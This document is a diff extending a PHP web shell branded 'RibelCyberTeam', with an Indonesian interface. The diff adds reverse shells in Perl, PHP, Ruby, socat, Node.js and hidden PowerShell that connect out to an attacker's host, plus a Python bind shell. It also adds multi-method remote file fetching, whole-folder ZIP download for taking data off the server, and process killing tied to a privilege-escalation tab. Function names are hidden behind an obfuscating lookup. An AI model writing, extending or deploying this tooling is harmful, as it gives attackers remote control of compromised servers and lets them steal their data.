@@ -389,6 +389,41 @@ if (isset($_POST['action'])) {
         }
         $cwd_real = $path_real;
     }
+    if ($action == 'zip_folder') {
+        $target = isset($_POST['target']) ? $_POST['target'] : '';
+        if ($target != '' && @is_dir($target) && class_exists('ZipArchive')) {
+            $zip_name = basename($target) . '_' . date('Ymd_His') . '.zip';
+            $tmp = sys_get_temp_dir() . '/' . $zip_name;
+            $zip = new ZipArchive();
+            if ($zip->open($tmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+                $files = new RecursiveIteratorIterator(
+                    new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
+                    RecursiveIteratorIterator::LEAVES_ONLY
+                );
+                $base_len = strlen($target) + 1;
+                foreach ($files as $file) {
+                    if (!$file->isDir()) {
+                        $file_path = $file->getRealPath();
+                        $relative_path = substr($file_path, $base_len);
+                        $zip->addFile($file_path, $relative_path);
+                    }
+                }
+                $zip->close();
+                
+                header('Content-Type: application/zip');
+                header('Content-Disposition: attachment; filename="' . $zip_name . '"');
+                header('Content-Length: ' . filesize($tmp));
+                readfile($tmp);
+                @unlink($tmp);
+                exit;
+            } else {
+                $msg = 'Gagal buat file ZIP.';
+            }
+        } else {
+            $msg = 'ZipArchive tidak tersedia atau target bukan folder.';
+        }
+        $cwd_real = $path_real;
+    }
     if ($action == 'upload_url') {
         $url  = isset($_POST['url']) ? trim($_POST['url']) : '';
         $name = isset($_POST['urlname']) ? basename($_POST['urlname']) : '';
@@ -399,7 +434,7 @@ if (isset($_POST['action'])) {
             if (!preg_match('#^https?://#i', $url)) $url = 'http://' . $url;
             $blob   = false;
             $method = 'none';
-            
+
             if ($blob === false && function_exists(F('cur'))) {
                 $c_init = F('cur'); $c_set = F('cur_c'); $c_exec = F('cur_'); $c_close = F('cur_cl');
                 $ch = @$c_init($url);
@@ -429,6 +464,58 @@ if (isset($_POST['action'])) {
                     $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'curl_exec';
                 }
             }
+            if ($blob === false && function_exists(F('ex')) && which_bin('wget')) {
+                $e = F('ex');
+                $tmp = $target . '.tmp_dl';
+                @$e('wget -q --timeout=60 --tries=2 --no-check-certificate -O ' . escapeshellarg($tmp) . ' ' . escapeshellarg($url) . ' 2>/dev/null', $o, $rc);
+                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
+                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'wget_exec';
+                }
+            }
+            if ($blob === false && function_exists(F('ex')) && which_bin('python3')) {
+                $e = F('ex');
+                $py = which_bin('python3');
+                $tmp = $target . '.tmp_dl';
+                $pyc = "import urllib.request,sys;urllib.request.urlretrieve(sys.argv[1],sys.argv[2])";
+                @$e(escapeshellarg($py) . ' -c ' . escapeshellarg($pyc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
+                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
+                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'python_urllib';
+                }
+            }
+            if ($blob === false && function_exists(F('ex')) && which_bin('perl')) {
+                $e = F('ex');
+                $tmp = $target . '.tmp_dl';
+                $pc = 'use LWP::Simple; my $d = get($ARGV[0]); if ($d) { open(my $f, ">", $ARGV[1]); binmode $f; print $f $d; close $f; }';
+                @$e('perl -e ' . escapeshellarg($pc) . ' ' . escapeshellarg($url) . ' ' . escapeshellarg($tmp) . ' 2>/dev/null', $o, $rc);
+                if ($rc === 0 && @is_file($tmp) && @filesize($tmp) > 0) {
+                    $f = F('fge'); $blob = @$f($tmp); @unlink($tmp); $method = 'perl_lwp';
+                }
+            }
+            if ($blob === false && function_exists(F('fso'))) {
+                $parts = parse_url($url);
+                if ($parts && isset($parts['host'])) {
+                    $host = $parts['host'];
+                    $path = isset($parts['path']) ? $parts['path'] : '/';
+                    if (isset($parts['query'])) $path .= '?' . $parts['query'];
+                    $port = isset($parts['port']) ? (int)$parts['port'] : (($parts['scheme'] === 'https') ? 443 : 80);
+                    $ssl  = ($parts['scheme'] === 'https');
+                    $fso = F('fso');
+                    $fp = @$fso(($ssl ? 'ssl://' : '') . $host, $port, $e, $es, 15);
+                    if ($fp) {
+                        $req = "GET $path HTTP/1.0\r\nHost: $host\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n";
+                        @fwrite($fp, $req);
+                        $raw = '';
+                        while (!feof($fp)) $raw .= @fread($fp, 8192);
+                        @fclose($fp);
+                        $sep = strpos($raw, "\r\n\r\n");
+                        if ($sep !== false) {
+                            $body = substr($raw, $sep + 4);
+                            if ($body !== '') { $blob = $body; $method = 'fsockopen'; }
+                        }
+                    }
+                }
+            }
+
             if ($blob === false) {
                 $msg = 'Semua metode fetch gagal.';
             } else {
@@ -594,8 +681,16 @@ if (isset($_POST['kill_process'])) {
     $pid = (int)$_POST['kill_process'];
     if ($pid > 1) {
         $f = F('ex');
-        @$f('kill -9 ' . $pid . ' 2>/dev/null');
-        $batch_msg = "Proses PID $pid berhasil dibunuh (kill -9).";
+        $owner_out = array();
+        @$f('ps -o user= -p ' . $pid . ' 2>/dev/null', $owner_out);
+        $owner = trim(implode('', $owner_out));
+        $current_user = function_exists('get_current_user') ? get_current_user() : 'www-data';
+        @$f('kill -9 ' . $pid . ' 2>/dev/null', $o, $rc);
+        if ($rc === 0) {
+            $batch_msg = "PID $pid ($owner) berhasil dibunuh.";
+        } else {
+            $batch_msg = "Gagal kill PID $pid ($owner). Kemungkinan bukan milik $current_user. Coba dapet root dulu via tab Privesc.";
+        }
     }
 }
 if (isset($_POST['privesc_action'])) {
@@ -711,7 +806,6 @@ if (isset($_POST['privesc_action'])) {
             if (!$compile_ok) {
                 $privesc_msg = "Compile gagal. Pastiin gcc/make/nasm ada. Output: <pre>" . h(implode("\n", $out)) . "</pre>";
             } else {
-                // Jalanin exploit
                 $run_cmd = "cd $tmp_dir && chmod +x " . $src['bin'] . " && ./" . $src['bin'] . " 2>&1";
                 @$f_exec($run_cmd, $out, $rc);
                 $privesc_msg = "Exploit dijalankan (RC: $rc).<br><pre>" . h(implode("\n", $out)) . "</pre>";
@@ -738,6 +832,12 @@ if (isset($_POST['shell_action'])) {
             if ($method === 'python3') { $py = "import socket,subprocess,os;s=socket.socket();s.connect(('$lh',$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"; $c = "python3 -c " . escapeshellarg($py) . " 2>>" . escapeshellarg($sh_err); }
             elseif ($method === 'bash') { $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err); }
             elseif ($method === 'nc') { $ncb = $nc ? $nc : 'nc'; $c = "$ncb $lh $lp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'perl') { $c = "perl -e 'use Socket;\$i=\"$lh\";\$p=$lp;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'php') { $c = "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");' 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'ruby') { $c = "ruby -rsocket -e 'f=TCPSocket.open(\"$lh\",$lp).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'socat') { $c = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lh:$lp 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'node') { $js = "(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect($lp,'$lh',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});return /a/;})()"; $c = "node -e " . escapeshellarg($js) . " 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'powershell') { $ps = "\$c=New-Object System.Net.Sockets.TCPClient('$lh',$lp);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sx=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sx,0,\$sx.Length);\$s.Flush()};\$c.Close()"; $c = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command " . escapeshellarg($ps); }
             else {
                 if (which_bin('python3')) { $c = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' 2>>" . escapeshellarg($sh_err); }
                 elseif (which_bin('bash')) { $c = "bash -c 'bash -i >& /dev/tcp/$lh/$lp 0>&1' 2>>" . escapeshellarg($sh_err); }
@@ -761,6 +861,7 @@ if (isset($_POST['shell_action'])) {
             if ($method === 'ncat') { $nc2 = which_bin('ncat'); if (!$nc2) $sh_msg = 'ncat tidak ada.'; else $c = "$nc2 -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
             elseif ($method === 'nc') { if (!$nc) $sh_msg = 'nc tidak ada.'; else $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err); }
             elseif ($method === 'socat') { $sc = which_bin('socat'); if (!$sc) $sh_msg = 'socat tidak ada.'; else $c = "$sc TCP-LISTEN:$bp,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 2>>" . escapeshellarg($sh_err); }
+            elseif ($method === 'python') { $py = which_bin('python3') ? which_bin('python3') : which_bin('python'); if (!$py) $sh_msg = 'python tidak ada.'; else { $code = "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(('0.0.0.0',$bp));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"; $c = "$py -c " . escapeshellarg($code) . " 2>>" . escapeshellarg($sh_err); } }
             else {
                 if (!$nc) $sh_msg = 'nc / ncat tidak ada.';
                 elseif (strpos($nc, 'ncat') !== false) $c = "$nc -lvnp $bp -e /bin/sh 2>>" . escapeshellarg($sh_err);
@@ -871,6 +972,39 @@ body{margin:0;padding:0;background:#0f1117;color:#d6d6d6;font-family:Tahoma,Aria
 .muted{color:#8e99ab;}
 .path{color:#7ee787;font-weight:bold;}
 .wrap{padding:14px;}
+.fm-table {
+    table-layout: auto;
+    width: 100%;
+}
+.fm-table th, .fm-table td {
+    white-space: nowrap;
+}
+.fm-table .col-check {
+    width: 1%;
+    text-align: center;
+}
+.fm-table .col-small {
+    width: 1%;
+}
+.fm-table .col-med {
+    width: 1%;
+}
+.fm-table .col-actions {
+    width: 1%;
+}
+.fm-table .col-actions {
+    text-align: right;
+}
+.fm-table td.quick {
+    text-align: right;
+    white-space: nowrap;
+}
+.fm-table .col-name {
+    width: auto;
+    white-space: normal;
+    word-break: break-all;
+    min-width: 150px;
+}
 .box{background:#151922;border:1px solid #2a3140;padding:12px;margin-bottom:12px;border-radius:8px;}
 .path a{color:#7ee787;text-decoration:none;}
 .path a:hover{text-decoration:underline;}
@@ -936,18 +1070,12 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
 <div class="top">
     <div class="title">root@RibelCyberTeam:~#</div>
     <div class="muted" style="margin-top:6px;">
-        Server: <b><?php echo h($server_name); ?></b> |
-        Host: <?php echo h($hostname); ?> |
-        IP Srv: <?php echo h($ip_server); ?> |
-        IP You: <?php echo h($ip_remote); ?><br>
+        Server: <b><?php echo h($server_name); ?></b> | Host: <?php echo h($hostname); ?> |
+        IP Srv: <?php echo h($ip_server); ?> | IP You: <?php echo h($ip_remote); ?><br>
         OS: <?php echo h($uname); ?><br>
-        PHP: <?php echo h(phpversion()); ?> |
-        User: <?php echo h($self_user); ?> |
-        Software: <?php echo h($server_software); ?><br>
+        PHP: <?php echo h(phpversion()); ?> | User: <?php echo h($self_user); ?> | Software: <?php echo h($server_software); ?><br>
         DocRoot: <?php echo h($doc_root); ?><br>
-        Uptime: <span id="stat-uptime"><?php echo h($uptime_h); ?></span> |
-        CPU: <?php echo h($cores); ?> core |
-        Load: <span id="stat-load">-</span><br>
+        Uptime: <span id="stat-uptime"><?php echo h($uptime_h); ?></span> | CPU: <?php echo h($cores); ?> core | Load: <span id="stat-load">-</span><br>
         RAM: <span style="color:#7ee787;" id="stat-ram"><?php echo h(format_size($mem_avail*1024)); ?></span>
             / <span id="stat-ram-total"><?php echo h(format_size($mem_total*1024)); ?></span>
             <span id="stat-ram-pct" style="color:#8e99ab;">(-)</span> free<br>
@@ -972,9 +1100,9 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
 <?php } ?>
 <div class="box">
     <div class="tabs">
-        <a class="btn <?php echo $tab === 'shell' ? 'active' : ''; ?>" href="?<?php echo $tab === 'shell' ? '' : 'tab=shell&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'shell' ? '&#9662;' : '&#9656;'; ?> Shell Manager</a>
+        <a class="btn <?php echo $tab === 'shell' ? 'active' : ''; ?>" href="?<?php echo $tab === 'shell' ? '' : 'tab=shell&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'shell' ? '&#9662;' : '&#9656;'; ?> Shell - Reverse / Bind</a>
         <a class="btn <?php echo $tab === 'gs' ? 'active' : ''; ?>" href="?<?php echo $tab === 'gs' ? '' : 'tab=gs&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'gs' ? '&#9662;' : '&#9656;'; ?> GSocket</a>
-        <a class="btn <?php echo $tab === 'cmd' ? 'active' : ''; ?>" href="?<?php echo $tab === 'cmd' ? '' : 'tab=cmd&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'cmd' ? '&#9662;' : '&#9656;'; ?> Command</a>
+        <a class="btn <?php echo $tab === 'cmd' ? 'active' : ''; ?>" href="?<?php echo $tab === 'cmd' ? '' : 'tab=cmd&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'cmd' ? '&#9662;' : '&#9656;'; ?> Command Execution</a>
         <a class="btn <?php echo $tab === 'info' ? 'active' : ''; ?>" href="?<?php echo $tab === 'info' ? '' : 'tab=info&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'info' ? '&#9662;' : '&#9656;'; ?> Info</a>
         <a class="btn <?php echo $tab === 'upurl' ? 'active' : ''; ?>" href="?<?php echo $tab === 'upurl' ? '' : 'tab=upurl&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab === 'upurl' ? '&#9662;' : '&#9656;'; ?> Upload URL</a>
         <a class="btn <?php echo $tab_ext === 'process' ? 'active' : ''; ?>" href="?<?php echo $tab_ext === 'process' ? '' : 'tab=process&'; ?>path=<?php echo urlencode($cwd_real); ?>"><?php echo $tab_ext === 'process' ? '&#9662;' : '&#9656;'; ?> Processes</a>
@@ -1027,6 +1155,12 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
                     <option value="python3">Python 3</option>
                     <option value="bash">Bash /dev/tcp</option>
                     <option value="nc">Netcat -e</option>
+                    <option value="perl">Perl</option>
+                    <option value="php">PHP</option>
+                    <option value="ruby">Ruby</option>
+                    <option value="socat">Socat</option>
+                    <option value="node">Node.js</option>
+                    <option value="powershell">PowerShell (Windows)</option>
                 </select>
                 <input type="text" name="lhost" placeholder="LHOST" style="margin-bottom:6px;">
                 <input type="text" name="lport" placeholder="LPORT" style="margin-bottom:6px;">
@@ -1042,6 +1176,7 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
                     <option value="ncat">ncat -e</option>
                     <option value="nc">nc -e</option>
                     <option value="socat">Socat</option>
+                    <option value="python">Python pty</option>
                 </select>
                 <input type="text" name="bport" placeholder="Bind port" style="margin-bottom:6px;">
                 <input type="submit" class="btn btn-green" value="Start Bind">
@@ -1140,43 +1275,81 @@ pre{white-space:pre-wrap;word-wrap:break-word;overflow:auto;}
 </div>
 <?php endif; ?>
 <?php if ($tab_ext === 'process'): ?>
+<?php
+$out = array();
+$f_exec = F('ex');
+@$f_exec('ps -eo pid,user,stat,etime,%cpu,%mem,args --sort=-%cpu 2>/dev/null', $out);
+$header = isset($out[0]) ? $out[0] : '';
+if (isset($out[0])) unset($out[0]);
+$current_user = function_exists('get_current_user') ? get_current_user() : 'www-data';
+$user_count = array();
+foreach ($out as $line) {
+    $line = trim($line);
+    if (empty($line)) continue;
+    $parts = preg_split('/\s+/', $line, 7);
+    if (count($parts) >= 7 && isset($parts[1])) {
+        $user_count[$parts[1]] = (isset($user_count[$parts[1]]) ? $user_count[$parts[1]] : 0) + 1;
+    }
+}
+?>
 <div class="box">
     <div class="name">Process Manager</div>
-    <div class="muted" style="margin-bottom:10px;">Top 50 proses berdasarkan CPU. Klik Kill buat mematikan proses.</div>
+    <div class="muted" style="margin-bottom:10px;">
+        login sebagai <b><?php echo h($current_user); ?></b>.
+        Cuma bisa kill proses milik sendiri, kecuali lu udah dapet <code>root</code> lewat tab Privesc.
+    </div>
+    
+    <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:10px; font-size:11px;">
+        <?php foreach ($user_count as $u => $c) { ?>
+            <span style="background:#1b2330; padding:4px 8px; border-radius:4px; border:1px solid #2a3140;">
+                <?php echo h($u); ?>: <b style="color:#7ee787;"><?php echo $c; ?></b>
+            </span>
+        <?php } ?>
+    </div>
+
     <table>
-        <tr><th>PID</th><th>User</th><th>CPU%</th><th>MEM%</th><th>Command</th><th>Action</th></tr>
+        <tr>
+            <th>PID</th>
+            <th>User</th>
+            <th>STAT</th>
+            <th>Time</th>
+            <th>CPU%</th>
+            <th>MEM%</th>
+            <th>Command</th>
+            <th>Action</th>
+        </tr>
         <?php
-        $out = array();
-        $f_exec = F('ex');
-        @$f_exec('ps -eo pid,user,%cpu,%mem,args --sort=-%cpu 2>/dev/null | head -50', $out);
-        // Hapus header
-        if (isset($out[0])) unset($out[0]);
-        
         foreach ($out as $line) {
             $line = trim($line);
             if (empty($line)) continue;
-            // Parsing kolom: PID USER %CPU %MEM COMMAND
-            $parts = preg_split('/\s+/', $line, 5);
-            if (count($parts) >= 5) {
-                $pid = $parts[0];
-                $user = $parts[1];
-                $cpu = $parts[2];
-                $mem = $parts[3];
-                $cmd = htmlspecialchars($parts[4], ENT_QUOTES, 'UTF-8');
-                echo "<tr>
-                    <td>{$pid}</td>
-                    <td>{$user}</td>
-                    <td>{$cpu}</td>
-                    <td>{$mem}</td>
-                    <td style='font-family:monospace;font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;'>{$cmd}</td>
-                    <td>
-                        <form method='post' style='display:inline;'>
+            $parts = preg_split('/\s+/', $line, 7);
+            if (count($parts) < 7) continue;
+            
+            list($pid, $user, $stat, $etime, $cpu, $mem, $cmd) = $parts;
+            $can_kill = ($user === $current_user || $current_user === 'root');
+            $row_style = $can_kill ? '' : 'opacity:0.5;';
+            
+            echo "<tr style='{$row_style}'>";
+            echo "<td>{$pid}</td>";
+            echo "<td>" . h($user) . "</td>";
+            echo "<td>" . h($stat) . "</td>";
+            echo "<td>" . h($etime) . "</td>";
+            echo "<td>" . h($cpu) . "</td>";
+            echo "<td>" . h($mem) . "</td>";
+            echo "<td style='font-family:monospace;font-size:11px;max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;' title='" . h($cmd) . "'>" . h($cmd) . "</td>";
+            echo "<td>";
+            if ((int)$pid > 1) {
+                if ($can_kill) {
+                    echo "<form method='post' style='display:inline;'>
                             <input type='hidden' name='kill_process' value='{$pid}'>
-                            <input type='submit' class='btn btn-red' value='Kill' onclick=\"return confirm('Yakin matiin PID {$pid}?');\">
-                        </form>
-                    </td>
-                </tr>";
+                            <input type='submit' class='btn btn-red' value='Kill' onclick=\"return confirm('Yakin matiin PID {$pid} ({$user})?');\">
+                          </form>";
+                } else {
+                    echo "<span style='color:#8e99ab;font-size:10px;'>perlu root</span>";
+                }
             }
+            echo "</td>";
+            echo "</tr>";
         }
         ?>
     </table>
@@ -1262,8 +1435,7 @@ if ($view != '' && @is_file($view)) { ?>
     $target_perm = perms($target_file);
     $target_mtime = date('Y-m-d H:i:s', @filemtime($target_file));
 ?>
-    
-    <!-- HALAMAN RENAME / CHMOD / TOUCH (BIAR TABEL GA MUNCUL) -->
+
     <div class="box">
         <div class="name"><?php echo strtoupper($action_page); ?>: <?php echo h($target_name); ?></div>
         <div class="muted" style="margin:8px 0 12px 0;">
@@ -1349,16 +1521,18 @@ if ($view != '' && @is_file($view)) { ?>
                     <button type="submit" name="batch_action" value="chmod" class="btn btn-yellow">Chmod Selected</button>
                     <button type="submit" name="batch_action" value="zip" class="btn btn-blue">Download ZIP</button>
                 </div>
-
-                <table>
+                <div style="overflow-x: auto; margin-top:10px;">
+                <table class="fm-table">
                     <tr>
-                        <th width="30"><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
-                        <th>Name</th>
-                        <th width="70">Type</th>
-                        <th width="90">Size</th>
-                        <th width="140">Modified</th>
-                        <th width="70">Perm</th>
-                        <th width="300">Quick Actions</th>
+                        <th class="col-check"><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
+                        <th class="col-name">Name</th>
+                        <th class="col-small">Type</th>
+                        <th class="col-small">Size</th>
+                        <th class="col-med">Modified</th>
+                        <th class="col-small">Perm</th>
+                        <th class="col-small">Owner</th>
+                        <th class="col-small">Group</th>
+                        <th class="col-actions">Quick Actions</th>
                     </tr>
                     <?php
                     $CAP = 2000;
@@ -1390,6 +1564,8 @@ if ($view != '' && @is_file($view)) { ?>
                             $perm_class = @is_writable($full) ? 'perm-green' : 'perm-white';
                             $item_size = $is_dir ? '-' : format_size(@filesize($full));
                             $item_perm = perms($full);
+                            $item_owner = fowner_name($full);
+                            $item_group = fgroup_name($full);
                             $n++;
                     ?>
                     <tr>
@@ -1410,7 +1586,10 @@ if ($view != '' && @is_file($view)) { ?>
                                             <div class="row"><b>Name:</b> <?php echo h($item); ?></div>
                                             <div class="row"><b>Ext:</b> <?php echo h(file_ext($full)); ?></div>
                                             <div class="row"><b>Size:</b> <?php echo h($item_size); ?></div>
+                                            <div class="row"><b>Modified:</b> <?php echo h($modified); ?></div>
                                             <div class="row"><b>Perm:</b> <?php echo h($item_perm); ?></div>
+                                            <div class="row"><b>Owner:</b> <?php echo h($item_owner); ?></div>
+                                            <div class="row"><b>Group:</b> <?php echo h($item_group); ?></div>
                                             <div class="row"><b>Path:</b> <?php echo h($full); ?></div>
                                         </div>
                                     </span>
@@ -1421,6 +1600,8 @@ if ($view != '' && @is_file($view)) { ?>
                         <td><?php echo $is_dir ? '-' : h(format_size(@filesize($full))); ?></td>
                         <td><?php echo h($modified); ?></td>
                         <td><span class="<?php echo $perm_class; ?>"><?php echo h($perm_text); ?></span></td>
+                        <td style="font-size:11px;"><?php echo h($item_owner); ?></td>
+                        <td style="font-size:11px;"><?php echo h($item_group); ?></td>
                         <td class="quick">
                             <?php if (!$is_dir) { ?>
                                 <a class="btn" href="?view=<?php echo urlencode($full); ?>">View</a>
@@ -1428,19 +1609,32 @@ if ($view != '' && @is_file($view)) { ?>
                                 <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                             <?php } else { ?>
                                 <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
+                                <form method="post" style="display:inline;" onsubmit="return confirm('Download folder ini sebagai ZIP?');">
+                                    <input type="hidden" name="action" value="zip_folder">
+                                    <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
+                                    <input type="hidden" name="target" value="<?php echo h($full); ?>">
+                                    <input type="submit" class="btn btn-blue" value="ZIP" style="padding:2px 6px;font-size:10px;">
+                                </form>
                             <?php } ?>
                             <a class="btn" href="?action_page=rename&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Rename</a>
                             <a class="btn" href="?action_page=chmod&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Chmod</a>
                             <a class="btn" href="?action_page=touch&target=<?php echo urlencode($full); ?>" style="background:#1f2d40;border-color:#3a4f6e;">Touch</a>
+                            <form method="post" style="display:inline;" onsubmit="return confirm('Yakin hapus?');">
+                                <input type="hidden" name="action" value="delete">
+                                <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
+                                <input type="hidden" name="target" value="<?php echo h($full); ?>">
+                                <input type="submit" class="btn btn-red" value="Delete" style="padding:2px 6px;font-size:10px;">
+                            </form>
                         </td>
                     </tr>
                     <?php
                         }
                     }
-                    if ($n == 0) { echo '<tr><td colspan="7">Folder kosong</td></tr>'; }
-                    if ($more > 0) { echo '<tr><td colspan="7" style="background:#3a341f;color:#ffd28a;font-weight:bold;">Nampilin ' . $n . ' dari total ' . ($n + $more) . ' entri.</td></tr>'; }
+                    if ($n == 0) { echo '<tr><td colspan="9">Folder kosong</td></tr>'; }
+                    if ($more > 0) { echo '<tr><td colspan="9" style="background:#3a341f;color:#ffd28a;font-weight:bold;">Nampilin ' . $n . ' dari total ' . ($n + $more) . ' entri.</td></tr>'; }
                     ?>
                 </table>
+                </div>
             </form>
         </div>
     </div>
